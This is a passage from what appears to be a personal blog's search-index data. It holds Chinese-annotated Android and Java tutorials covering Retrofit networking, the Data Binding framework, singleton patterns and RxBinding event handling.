对象（为了不丢失类型信息而强制转换） } @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); DataBindingUtil.setContentView(this, R.layout.activity_main); final OkHttpClient okHttpClient = new OkHttpClient.Builder() 自定义 OkHttpClient（OkHttpClient 在整个 App 中应为单例） .connectTimeout(10, TimeUnit.SECONDS) 设置超时时间 .retryOnConnectionFailure(true) 失败重连 .addInterceptor(chain -\u0026gt; { 添加拦截器 Log.w(\u0026#34;Tag\u0026#34;, chain.request().url().toString()); 打印请求网址 return chain.proceed(chain.request()); 继续执行 }) .build(); final Retrofit retrofit = new Retrofit.Builder() .baseUrl(\u0026#34;https://echo.getpostman.com/\u0026#34;) .client(okHttpClient) 指定 OkHttpClient .addCallAdapterFactory(RxJavaCallAdapterFactory.create()) 使用 RxJava 回调 .addConverterFactory(GsonConverterFactory.create()) 使用 JSON 格式 .build(); final APIService service = retrofit.create(APIService.class); 创建服务实例 final List\u0026lt;String\u0026gt; list = Arrays.asList(\u0026#34;AA\u0026#34;, \u0026#34;BB\u0026#34;, \u0026#34;CC\u0026#34;, \u0026#34;DD\u0026#34;); service.get(\u0026#34;AA\u0026#34;) .compose(applySchedulers()) .subscribe(mAction1); 开始访问 \u0026#34;https://echo.getpostman.com/get?name=AA\u0026#34; service.get2(list) .compose(applySchedulers()) .subscribe(mAction1); 开始访问 \u0026#34;https://echo.getpostman.com/get?name=AA\u0026amp;name=BB\u0026amp;name=CC\u0026amp;name=DD\u0026#34; service.headers(\u0026#34;Chrome\u0026#34;) .compose(applySchedulers()) .subscribe(mAction1); 开始访问 \u0026#34;https://echo.getpostman.com/headers\u0026#34; service.post(\u0026#34;Hello World!\u0026#34;) .compose(applySchedulers()) .subscribe(mAction1); 开始访问 \u0026#34;https://echo.getpostman.com/post\u0026#34; service.post2(\u0026#34;ABC\u0026#34;) .compose(applySchedulers()) .subscribe(mAction1); 开始访问 \u0026#34;https://echo.getpostman.com/post\u0026#34; final Map\u0026lt;String, Object\u0026gt; map = new ArrayMap\u0026lt;\u0026gt;(); map.put(\u0026#34;q\u0026#34;, \u0026#34;无人\u0026#34;); map.put(\u0026#34;tag\u0026#34;, \u0026#34;\u0026#34;); map.put(\u0026#34;start\u0026#34;, 0); map.put(\u0026#34;count\u0026#34;, 5); service.searchBook(\u0026#34;无人\u0026#34;, null, 0, 5) .compose(applySchedulers()) .subscribe(mAction1); 开始访问 \u0026#34;https://api.douban.com/v2/book/search?q=无人\u0026amp;start=0\u0026amp;count=5\u0026#34; service.searchBook2(map) .compose(applySchedulers()) .subscribe(mAction1); 开始访问 \u0026#34;https://api.douban.com/v2/book/search?q=无人\u0026amp;tag=\u0026amp;count=5\u0026amp;start=0\u0026#34; service.getWeather(\u0026#34;fb71ed4dc47c3559ebf3bf588304608f\u0026#34;, \u0026#34;重庆\u0026#34;) .compose(applySchedulers()) .subscribe(mAction1); 开始访问 \u0026#34;http://apis.baidu.com/apistore/weatherservice/citylist?cityname=重庆\u0026#34; service.getWeather2(\u0026#34;重庆\u0026#34;) .compose(applySchedulers()) .subscribe(mAction1); 开始访问 \u0026#34;http://apis.baidu.com/apistore/weatherservice/citylist?cityname=重庆\u0026#34; service.getJSON(\u0026#34;https://www.v2ex.com/api/members/show.json?username=xhstormr\u0026#34;) .compose(applySchedulers()) .subscribe(mAction1); 开始访问 \u0026#34;https://www.v2ex.com/api/members/show.json?username=xhstormr\u0026#34; service.downloadFile(\u0026#34;http://ww4.sinaimg.cn/large/a15b4afegw1f7vhnqa9soj203k03kwfe\u0026#34;) .subscribeOn(Schedulers.io()) 指定最开始在IO线程中运行 .subscribe( responseBody -\u0026gt; { 下载图片至 /storage/sdcard0/123456/123.png File dir = new File(Environment.getExternalStorageDirectory(), \u0026#34;123456\u0026#34;); dir.mkdirs(); try (BufferedSource bufferedSource = responseBody.source(); BufferedSink bufferedSink = Okio.buffer(Okio.sink(new File(dir, \u0026#34;123.png\u0026#34;)))) { bufferedSink.writeAll(bufferedSource); } catch (IOException e) { e.printStackTrace(); } }, error -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, error.toString()), () -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;onComplete\u0026#34;)); } } Reference https://zhuanlan.zhihu.com/p/21808012 ","permalink":"https://xhstormr.github.io/blog/posts/java-retrofit/","summary":"","title":"Retrofit"},{"content":"Updated on 2016-12-03\nModel（数据），View（界面），Controller（业务逻辑）\nMVC（Model - View - Controller）\nMVP（Model - View - Presenter）\nMVVM（Model - View - ViewModel）\nModel（数据），View（界面），ViewModel（双向绑定）\nhttps://developer.android.com/topic/libraries/data-binding/index.html\n双向绑定 View Listeners：将 View 响应事件产生的数据设置到 Model 中。 将 View 的事件映射到 Model 可以承载的数据格式。 Data Bindings：在 Model 发生变化时通知 View 作出响应。 将 Model 的数据映射到 View 的界面上。 启用 Data Binding build.gradle ⇳ android { dataBinding { enabled = true } } Binding Data @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); ActivityMainBinding activityMainBinding = DataBindingUtil.setContentView(this, R.layout.activity_main); User user = new User(\u0026#34;A\u0026#34;, 25); Data Objects ↳ activity_main.xml ➜ ActivityMainBinding.java activityMainBinding.setUser(user); Binding Data Objects } \u0026lt;layout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34;\u0026gt; \u0026lt;layout\u0026gt; 节点 \u0026lt;data\u0026gt; \u0026lt;data\u0026gt; 节点（相当于 ViewModel，是 Model 和 View 之间的桥梁） \u0026lt;import type=\u0026#34;com.example.myapp.myapplication.User\u0026#34;/\u0026gt; \u0026lt;variable name=\u0026#34;user\u0026#34; user 初始为 null，所以各属性为各自的初始值，以防止因 NullPointerException 而 Crash type=\u0026#34;User\u0026#34;/\u0026gt; \u0026lt;/data\u0026gt; \u0026lt;LinearLayout \u0026lt;ViewGroup\u0026gt; 节点 android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:orientation=\u0026#34;vertical\u0026#34; android:padding=\u0026#34;16dp\u0026#34;\u0026gt; \u0026lt;TextView android:text=\u0026#39;@{\u0026#34;\u0026#34;+user.name}\u0026#39; @{表达式} android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:id=\u0026#34;@+id/textView1\u0026#34;/\u0026gt; \u0026lt;TextView android:text=\u0026#34;@{``+user.age,default=35}\u0026#34; 设计阶段预览值（,default=35） android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:id=\u0026#34;@+id/textView2\u0026#34;/\u0026gt; \u0026lt;/LinearLayout\u0026gt; \u0026lt;/layout\u0026gt; Data Objects（Data Bindings） 可观测对象 public class User extends BaseObservable { 继承已实现 Observable 接口的 BaseObservable private String name; private int age; public User(String name, int age) { 构造函数 this.name = name; this.age = age; } @Bindable 绑定数据（生成 BR.name） public String getName() { return name; } @Bindable 绑定数据（生成 BR.age） public int getAge() { return age; } public void setName(String name) { this.name = name; notifyPropertyChanged(BR.name); 通知数据改变 } public void setAge(int age) { this.age = age; notifyPropertyChanged(BR.age); 通知数据改变 } } ------------------------------------------------------- user.setName(\u0026#34;B\u0026#34;); String s = user.getName(); \u0026lt;data\u0026gt; \u0026lt;import type=\u0026#34;com.example.myapp.myapplication.User\u0026#34;/\u0026gt; \u0026lt;variable name=\u0026#34;user\u0026#34; type=\u0026#34;User\u0026#34;/\u0026gt; \u0026lt;/data\u0026gt; ---- android:text=\u0026#39;@{\u0026#34;\u0026#34;+user.name}\u0026#39; android:text=\u0026#39;@{\u0026#34;\u0026#34;+user.age}\u0026#39; 可观测字段 public class User { public final ObservableField\u0026lt;String\u0026gt; name = new ObservableField\u0026lt;\u0026gt;(); ObservableField（可观测对象） public final ObservableInt age = new ObservableInt(); ObservableInt（可观测对象） public User(String name, int age) { 构造函数 this.name.set(name); this.age.set(age); } } ------------------------------------------------------- user.name.set(\u0026#34;B\u0026#34;); String s = user.name.get(); \u0026lt;data\u0026gt; \u0026lt;import type=\u0026#34;com.example.myapp.myapplication.User\u0026#34;/\u0026gt; \u0026lt;variable name=\u0026#34;user\u0026#34; type=\u0026#34;User\u0026#34;/\u0026gt; \u0026lt;/data\u0026gt; ---- android:text=\u0026#39;@{\u0026#34;\u0026#34;+user.name}\u0026#39; android:text=\u0026#39;@{\u0026#34;\u0026#34;+user.age}\u0026#39; 可观测集合 ObservableArrayMap 索引为对象\nObservableArrayMap\u0026lt;String, Object\u0026gt; user = new ObservableArrayMap\u0026lt;\u0026gt;(); user.put(\u0026#34;name\u0026#34;, \u0026#34;A\u0026#34;); user.put(\u0026#34;age\u0026#34;, 25); ------------------------------------------------------- user.put(\u0026#34;name\u0026#34;, \u0026#34;B\u0026#34;); Object o = user.get(\u0026#34;name\u0026#34;); \u0026lt;data\u0026gt; \u0026lt;import type=\u0026#34;android.databinding.ObservableMap\u0026#34;/\u0026gt; \u0026lt;variable name=\u0026#34;user\u0026#34; type=\u0026#34;ObservableMap\u0026#34;/\u0026gt; \u0026lt;/data\u0026gt; ---- android:text=\u0026#39;@{\u0026#34;\u0026#34;+user[\u0026#34;name\u0026#34;]}\u0026#39; android:text=\u0026#39;@{\u0026#34;\u0026#34;+user[\u0026#34;age\u0026#34;]}\u0026#39; ObservableArrayList 索引为整数\nObservableArrayList\u0026lt;Object\u0026gt; user = new ObservableArrayList\u0026lt;\u0026gt;(); user.add(\u0026#34;A\u0026#34;); user.add(25); ------------------------------------------------------- user.set(0, \u0026#34;B\u0026#34;); Object o = user.get(0); \u0026lt;data\u0026gt; \u0026lt;import type=\u0026#34;android.databinding.ObservableList\u0026#34;/\u0026gt; \u0026lt;variable name=\u0026#34;user\u0026#34; type=\u0026#34;ObservableList\u0026#34;/\u0026gt; \u0026lt;/data\u0026gt; ---- android:text=\u0026#39;@{\u0026#34;\u0026#34;+user[0]}\u0026#39; android:text=\u0026#39;@{\u0026#34;\u0026#34;+user[1]}\u0026#39; Event Handling（View Listeners） Method References 数据绑定时就评估表达式，方法签名需相同。\npublic class A { public void a(View view) { 对应接口 OnClickListener 中的 onClick 方法 Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;单击_\u0026#34; + view.getResources().getResourceEntryName(view.getId())); } public boolean b(View view) { 对应接口 OnLongClickListener 中的 onLongClick 方法 Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;长按_\u0026#34; + view.getResources().getResourceEntryName(view.getId())); return true; } public void c(CharSequence s, int i1, int i2, int i3) { 对应接口 TextWatcher 中的 onTextChanged 方法 Log.w(\u0026#34;Tag\u0026#34;, s.toString()); } } \u0026lt;data\u0026gt; \u0026lt;import type=\u0026#34;com.example.myapp.myapplication.A\u0026#34;/\u0026gt; \u0026lt;variable name=\u0026#34;a\u0026#34; type=\u0026#34;A\u0026#34;/\u0026gt; \u0026lt;/data\u0026gt; ---- \u0026lt;EditText android:onClick=\u0026#34;@{a.a}\u0026#34; 传入对应方法即可，也可表达为 \u0026#34;@{a::a}\u0026#34; android:onLongClick=\u0026#34;@{a.b}\u0026#34; android:onTextChanged=\u0026#34;@{a.c}\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:id=\u0026#34;@+id/editText\u0026#34;/\u0026gt; Listener Bindings 事件发生时才评估表达式，只需返回值相同。\npublic class A { public void a(User user) { onClick 返回 void Log.w(\u0026#34;Tag\u0026#34;, String.format(\u0026#34;单击_%s_%s\u0026#34;, user.name.get(), user.age.get())); } public boolean b() { onLongClick 返回 boolean Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;长按\u0026#34;); return true; } public void c(User user, CharSequence s) { onTextChanged 返回 void Log.w(\u0026#34;Tag\u0026#34;, String.format(\u0026#34;%s_%s_%s\u0026#34;, s, user.name.get(), user.age.get())); } } \u0026lt;data\u0026gt; \u0026lt;import type=\u0026#34;com.example.myapp.myapplication.A\u0026#34;/\u0026gt; \u0026lt;import type=\u0026#34;com.example.myapp.myapplication.User\u0026#34;/\u0026gt; \u0026lt;variable name=\u0026#34;a\u0026#34; type=\u0026#34;A\u0026#34;/\u0026gt; \u0026lt;variable name=\u0026#34;user\u0026#34; type=\u0026#34;User\u0026#34;/\u0026gt; \u0026lt;/data\u0026gt; ---- \u0026lt;EditText Listener Bindings 本质是回调方法，使用 Lambda 表达式传递参数，若无需自动生成的监听器提供的参数，则可省略参数列表 android:onClick=\u0026#34;@{()-\u0026gt;a.a(user)}\u0026#34; android:onLongClick=\u0026#34;@{()-\u0026gt;a.b()}\u0026#34; android:onTextChanged=\u0026#34;@{(s,i1,i2,i3)-\u0026gt;a.c(user,s)}\u0026#34; 未省略参数列表 android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:id=\u0026#34;@+id/editText\u0026#34;/\u0026gt; @= 仅支持 text、checked、year、mouth、hour、rating、progress 等属性。\n\u0026lt;data\u0026gt; \u0026lt;variable name=\u0026#34;s\u0026#34; type=\u0026#34;String\u0026#34;/\u0026gt; lang 包下的类自动导入 \u0026lt;variable name=\u0026#34;b\u0026#34; type=\u0026#34;Boolean\u0026#34;/\u0026gt; lang 包下的类自动导入 \u0026lt;/data\u0026gt; ---- \u0026lt;TextView android:text=\u0026#34;@{s}\u0026#34; 自动同步 android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; \u0026lt;TextView android:text=\u0026#34;@{``+b}\u0026#34; 自动同步 android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; \u0026lt;EditText android:text=\u0026#34;@={s}\u0026#34; 自动更新 android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; \u0026lt;CheckBox android:checked=\u0026#34;@={b}\u0026#34; 自动更新 android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; OnPropertyChangedCallback Observable.OnPropertyChangedCallback propertyChangedCallback = new Observable.OnPropertyChangedCallback() { 抽象类 @Override public void onPropertyChanged(Observable sender, int propertyId) { 属性改变时调用 Log.w(\u0026#34;Tag\u0026#34;, propertyId + \u0026#34;_\u0026#34; + sender.toString()); } }; user.name.addOnPropertyChangedCallback(propertyChangedCallback); 添加回调 user.name.removeOnPropertyChangedCallback(propertyChangedCallback); 移除回调 注解 BindingAdapter 将 XML 中定义的属性值与对应的实现方法绑定在一起。\n绑定自定义属性 添加 新的 XML 属性及其实现。\n@BindingAdapter(\u0026#34;abc\u0026#34;) 注解（该方法与自定义属性 app:abc 关联） public static void a(TextView view, int height) { 为控件设置高度（该方法可以写在任意位置） ViewGroup.LayoutParams layoutParams = view.getLayoutParams(); layoutParams.height = height; view.setLayoutParams(layoutParams); } ------------------------------------------------------- @BindingAdapter(\u0026#34;abc\u0026#34;) public static void a(TextView view, int oldHeight, int newHeight) { 另外也可获取旧值（View，oldValue，newValue）（oldValue 最初为对应初始值，以防止 NullPointerException） Log.w(\u0026#34;Tag\u0026#34;, String.format(\u0026#34;旧值:%d,新值:%d\u0026#34;, oldHeight, newHeight)); } \u0026lt;data\u0026gt; \u0026lt;variable name=\u0026#34;height\u0026#34; type=\u0026#34;Integer\u0026#34;/\u0026gt; lang 包下的类自动导入 \u0026lt;/data\u0026gt; ---- \u0026lt;TextView app:abc=\u0026#34;@{height}\u0026#34; 使用自定义属性，传入 int，控件高度 android:text=\u0026#39;@{``+user.name}\u0026#39; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:id=\u0026#34;@+id/textView1\u0026#34;/\u0026gt; 绑定系统属性 对原有 XML 属性进行 重写。\n@BindingAdapter(\u0026#34;android:src\u0026#34;) 注解（该方法与系统属性 android:src 关联） public static void b(ImageView view, String url) { 为 ImageView 加载图片（该方法可以写在任意位置） Single .just(url) .map(s -\u0026gt; { Bitmap bitmap = null; try (BufferedInputStream bufferedInputStream = new BufferedInputStream(new URL(s).openStream())) { bitmap = BitmapFactory.decodeStream(bufferedInputStream); } catch (IOException e) { e.printStackTrace(); } return bitmap; }) .observeOn(AndroidSchedulers.mainThread()) .subscribeOn(Schedulers.io()) .subscribe(view::setImageBitmap); } \u0026lt;data\u0026gt; \u0026lt;variable name=\u0026#34;url\u0026#34; type=\u0026#34;String\u0026#34;/\u0026gt; lang 包下的类自动导入 \u0026lt;/data\u0026gt; ---- \u0026lt;ImageView android:src=\u0026#34;@{url}\u0026#34; @{} 表达式中传入 String android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; \u0026lt;ImageView android:src=\u0026#34;@mipmap/ic_launcher\u0026#34; 普通表达式不受影响 android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; 组合 注解（同时关联自定义属性 i1，i2，false 表示控件使用二者其一便可匹配该方法，缺失的属性用其初始值替代，默认为 true） 例： 若控件只使用了 i1，则 pic 为 0； 若控件只使用了 i2，则 url 为 null。 @BindingAdapter(value = {\u0026#34;i1\u0026#34;, \u0026#34;i2\u0026#34;}, requireAll = false) public static void a(ImageView view, String url, int pic) { 图片加载完成之前显示占位图（该方法可以写在任意位置） Single .just(url) .map(s -\u0026gt; { Bitmap bitmap = null; try (BufferedInputStream bufferedInputStream = new BufferedInputStream(new URL(url).openStream())) { bitmap = BitmapFactory.decodeStream(bufferedInputStream); } catch (IOException e) { e.printStackTrace(); } return bitmap; }) .doOnSubscribe(() -\u0026gt; view.setImageResource(pic)) 设置 resId 占位图（可在非 UI 线程） .observeOn(AndroidSchedulers.mainThread()) 切换至 UI 线程 (2) .subscribeOn(Schedulers.io()) 指定最开始在IO线程中运行 (1) .subscribe(view::setImageBitmap); 设置 Bitmap（必须在 UI 线程） } \u0026lt;data\u0026gt; \u0026lt;import type=\u0026#34;com.example.myapp.myapplication.R\u0026#34;/\u0026gt; 导入资源类 R \u0026lt;variable name=\u0026#34;url\u0026#34; type=\u0026#34;String\u0026#34;/\u0026gt; \u0026lt;/data\u0026gt; ---- \u0026lt;ImageView app:i1=\u0026#34;@{url}\u0026#34; 使用自定义属性，传入 String，图片链接 app:i2=\u0026#34;@{R.mipmap.ic_launcher}\u0026#34; 使用自定义属性，传入 int，占位图 android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; BindingConversion @BindingConversion public static ColorDrawable a(int color) { 接收 int，转换为 ColorDrawable 对象（该方法可以写在任意位置） Log.w(\u0026#34;Tag\u0026#34;, String.format(\u0026#34;方法被调用，color = %d\u0026#34;, color)); return new ColorDrawable(color); } \u0026lt;EditText android:background=\u0026#34;@{@color/colorAccent}\u0026#34; @{} 表达式中传入 int，background 属性接收 ColorDrawable 对象 android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; \u0026lt;EditText android:background=\u0026#34;@color/colorAccent\u0026#34; 普通表达式不受影响 android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; Code 使用静态方法 ------------------------------------------------------- public class A { public static String a(String s) { return \u0026#34;你好:\u0026#34; + s; } } \u0026lt;data\u0026gt; \u0026lt;import type=\u0026#34;com.example.myapp.myapplication.A\u0026#34;/\u0026gt; \u0026lt;import type=\u0026#34;com.example.myapp.myapplication.User\u0026#34;/\u0026gt; \u0026lt;variable name=\u0026#34;user\u0026#34; type=\u0026#34;User\u0026#34;/\u0026gt; \u0026lt;/data\u0026gt; ---- android:text=\u0026#34;@{A.a(user.name)}\u0026#34; 自定义 Binding 类名及生成位置 （默认为 activity_main.xml ➜ com.example.myapp.myapplication.databinding.ActivityMainBinding.java） ------------------------------------------------------- \u0026lt;data class=\u0026#34;ABC\u0026#34;\u0026gt; com.example.myapp.myapplication.databinding.ABC ... \u0026lt;/data\u0026gt; \u0026lt;data class=\u0026#34;.ABC\u0026#34;\u0026gt; com.example.myapp.myapplication.ABC ... \u0026lt;/data\u0026gt; \u0026lt;data class=\u0026#34;com.example.ABC\u0026#34;\u0026gt; com.example.ABC ... \u0026lt;/data\u0026gt; 运算符 （只有 this，super，new，\u0026lt;\u0026gt;泛型不支持） ------------------------------------------------------- android:text=\u0026#39;@{user.name ?? \u0026#34;无名氏\u0026#34;}\u0026#39; \u0026#34;A\u0026#34; ?? \u0026#34;B\u0026#34; 选取第一个非空值作为结果 等同于 android:text=\u0026#39;@{user.name != null ? user.name : \u0026#34;无名氏\u0026#34;}\u0026#39; \u0026#34;A\u0026#34; != null ? \u0026#34;A\u0026#34; : \u0026#34;B\u0026#34; android:text=\u0026#34;@{``+user.age}\u0026#34; \u0026#34;``\u0026#34; 等同于 android:text=\u0026#39;@{\u0026#34;\u0026#34;+user.age}\u0026#39; \u0026#39;\u0026#34;\u0026#34;\u0026#39; 使用 ID ------------------------------------------------------- \u0026lt;TextView android:id=\u0026#34;@+id/textView\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; \u0026lt;EditText android:onTextChanged=\u0026#34;@{(s,i1,i2,i3)-\u0026gt;textView.setText(s)}\u0026#34; textView 同步显示输入 android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; ------------------------------------------------------- \u0026lt;data\u0026gt; \u0026lt;variable name=\u0026#34;b\u0026#34; type=\u0026#34;Boolean\u0026#34;/\u0026gt; Boolean 初始值为 false \u0026lt;/data\u0026gt; ---- \u0026lt;TextView android:id=\u0026#34;@+id/textView\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; \u0026lt;EditText android:id=\u0026#34;@+id/editText\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; \u0026lt;Button android:enabled=\u0026#34;@{b}\u0026#34; 自动同步 android:onClick=\u0026#34;@{()-\u0026gt;textView.setText(editText.getText())}\u0026#34; 使用 ID，直接在布局中处理逻辑 android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;New Button\u0026#34;/\u0026gt; \u0026lt;CheckBox android:checked=\u0026#34;@={b}\u0026#34; 自动更新（勾选启用按钮） android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; ------------------------------------------------------- \u0026lt;data\u0026gt; \u0026lt;import type=\u0026#34;android.view.View\u0026#34;/\u0026gt; \u0026lt;/data\u0026gt; ---- \u0026lt;CheckBox android:id=\u0026#34;@+id/checkBox\u0026#34; 勾选显示图片并启用按钮 android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; \u0026lt;ImageView android:visibility=\u0026#34;@{checkBox.checked?View.VISIBLE:View.GONE}\u0026#34; 显示或隐藏（CheckBox 隐式自动更新） android:src=\u0026#34;@mipmap/ic_launcher\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; \u0026lt;Button android:enabled=\u0026#34;@{checkBox.checked}\u0026#34; 启用或禁用（CheckBox 隐式自动更新） android:text=\u0026#34;New Button\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; 所有 EditText 的字段不为空才启用按钮 ------------------------------------------------------- public class Presenter { public static boolean a(String s1, String s2) { if (s1 == null || s2 == null) { return false; } return !s1.equals(\u0026#34;\u0026#34;) \u0026amp;\u0026amp; !s2.equals(\u0026#34;\u0026#34;); 所有 EditText 的字段不为空才启用按钮 } } ------------------------------------------------------- \u0026lt;data\u0026gt; \u0026lt;import type=\u0026#34;com.example.myapp.myapplication.Presenter\u0026#34;/\u0026gt; \u0026lt;variable name=\u0026#34;s1\u0026#34; type=\u0026#34;String\u0026#34;/\u0026gt; \u0026lt;variable name=\u0026#34;s2\u0026#34; type=\u0026#34;String\u0026#34;/\u0026gt; \u0026lt;/data\u0026gt; ---- \u0026lt;EditText android:text=\u0026#34;@={s1}\u0026#34; 自动更新 android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; \u0026lt;EditText android:text=\u0026#34;@={s2}\u0026#34; 自动更新 android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; \u0026lt;Button android:enabled=\u0026#39;@{Presenter.a(s1,s2)}\u0026#39; 所有 EditText 的字段不为空才启用按钮 android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;New Button\u0026#34;/\u0026gt; ","permalink":"https://xhstormr.github.io/blog/posts/android-databinding/","summary":"","title":"Data Binding Framework"},{"content":"Updated on 2016-11-19\nhttps://zh.wikipedia.org/zh-cn/单例模式\nsrc\n饿汉方式 实例在 加载时 就创建。\npublic class A { private static final A Instance = new A(); private A() { 私有构造方法 } public static A getInstance() { return Instance; } } 懒汉方式 实例在 使用时 才创建。\npublic class A { 双重校验锁 private static volatile A Instance; 禁止指令重排并保证可见性 private A() { 私有构造方法 } public static A getInstance() { if (Instance == null) { 第一次检查 synchronized (A.class) { if (Instance == null) { 第二次检查（防止多个进程因同时判断实例为 null，而进入同步块，而再次实例化） Instance = new A(); } } } return Instance; } } public class A { 静态内部类 private A() { 私有构造方法 } public static A getInstance() { return InstanceHolder.Instance; 由 JVM 类加载机制来保证单例 } private static class InstanceHolder { 静态内部类为饿汉方式 private static final A Instance = new A(); } } public static void main(String[] args) { IntStream.range(0, 2000).forEach(o -\u0026gt; new Thread(() -\u0026gt; System.out.println(A.getInstance().hashCode())).start()); or Stream.generate(() -\u0026gt; new Thread(() -\u0026gt; System.out.println(A.getInstance().hashCode()))).limit(2000).forEach(Thread::start); } ","permalink":"https://xhstormr.github.io/blog/posts/java-singleton/","summary":"","title":"Java Singleton"},{"content":"Updated on 2016-11-19\nhttps://github.com/JakeWharton/RxBinding\nButton ActivityMainBinding activityMainBinding = DataBindingUtil.setContentView(this, R.layout.activity_main); Button button = activityMainBinding.button; ------------------------------------------------------- RxView .clicks(button) 绑定单击事件 .throttleFirst(1, TimeUnit.SECONDS) 防止多次点击（1 秒内只发送第一个点击事件） .subscribe(aVoid -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;单击\u0026#34;)); or RxView .clicks(button) 绑定单击事件 .doOnNext(aVoid -\u0026gt; { button.setEnabled(false); 禁用按钮 Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;单击\u0026#34;); }) .delay(1, TimeUnit.SECONDS) 延迟 1 秒（等待时默认会切换至计算线程） .observeOn(AndroidSchedulers.mainThread()) 切回至主线程 .doOnNext(aVoid -\u0026gt; button.setEnabled(true)) 启用按钮 .subscribe(); ------------------------------------------------------- RxView .longClicks(button) 绑定长按事件 .subscribe(aVoid -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;长按\u0026#34;)); CheckBox ActivityMainBinding activityMainBinding = DataBindingUtil.setContentView(this, R.layout.activity_main); Button button = activityMainBinding.button; CheckBox checkBox = activityMainBinding.checkBox; ------------------------------------------------------- RxCompoundButton .checkedChanges(checkBox) .subscribe(aBoolean -\u0026gt; button.setEnabled(aBoolean)); 选中才启用按钮 ListView ActivityMainBinding activityMainBinding = DataBindingUtil.setContentView(this, R.layout.activity_main); Character[] res = new Character[20]; 数据源 for (int i = 0, j = 65; i \u0026lt; res.length; i++) { res[i] = ((char) j++); } ListView listView = activityMainBinding.listView; 1控件 ArrayAdapter\u0026lt;Character\u0026gt; adapter = new ArrayAdapter\u0026lt;\u0026gt;(this, android.R.layout.simple_list_item_1, res); 2数组适配器 listView.setAdapter(adapter); 3将控件与适配器绑定 ------------------------------------------------------- RxAdapterView .itemClicks(listView) 绑定单击事件 .subscribe(integer -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;单击:\u0026#34; + integer)); ------------------------------------------------------- RxAdapterView .itemLongClicks(listView) 绑定长按事件 .subscribe(integer -\u0026gt; Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;长按:\u0026#34; + integer)); ------------------------------------------------------- RxAbsListView .scrollEvents(listView) 绑定滚动事件 .subscribe(absListViewScrollEvent -\u0026gt; { switch (absListViewScrollEvent.scrollState()) { case SCROLL_STATE_TOUCH_SCROLL: Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;1正在滚动(手指未离开)\u0026#34;); break; case SCROLL_STATE_FLING: Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;2正在滑动(手指已离开)\u0026#34;); break; case SCROLL_STATE_IDLE: Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;3停止滚动\u0026#34;); break; } if (absListViewScrollEvent.firstVisibleItem() == 0) { Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;在顶部\u0026#34;); } if (absListViewScrollEvent.firstVisibleItem() + absListViewScrollEvent.visibleItemCount() == absListViewScrollEvent.totalItemCount()) { Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;在底部\u0026#34;); } }); ","permalink":"https://xhstormr.github.io/blog/posts/android-rxbinding/","summary":"","title":"RxBinding"},{"content":"Updated on 2016-11-19\nSubject 